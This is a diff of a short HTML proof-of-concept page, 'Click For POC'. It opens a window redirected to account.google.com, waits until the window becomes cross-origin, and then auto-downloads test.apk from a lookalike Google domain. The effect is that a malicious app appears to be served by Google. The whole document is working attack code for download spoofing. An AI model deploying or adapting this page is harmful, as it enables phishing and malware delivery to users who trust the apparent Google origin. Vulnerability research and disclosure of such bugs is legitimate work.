@@ -1,19 +1,30 @@
-
-
 <html>
  <head>
   <script>
-  function next() {
-         w.location.replace('https://alphabet-google-drive-google-maps-mapss.github.io/test.apk');
-        }
+    function next() {
+      const a = document.createElement('a');
+      a.href = 'https://alphabet-google-drive-google-maps-mapss.github.io/test.apk';
+      a.download = '';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
 
-  function f() {
-    w = window.open("javascript:document.write('<h1></h1>');location='http://account.google.com'");
- 
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
-  }
-</script> 
+    function f() {
+      w = window.open("javascript:location.replace('https://account.google.com')");
+
+      i = setInterval(() => {
+        try {
+          x = w.location.href; // akan throw error jika sudah cross-origin
+        } catch (e) {
+          clearInterval(i);
+          next(); // trigger download setelah redirect terjadi
+        }
+      }, 100);
+    }
+  </script>
  </head>
  <body>
   <center><a href="#" onclick="f()">Click For POC</a></center>
- </html>
+ </body>
+</html>
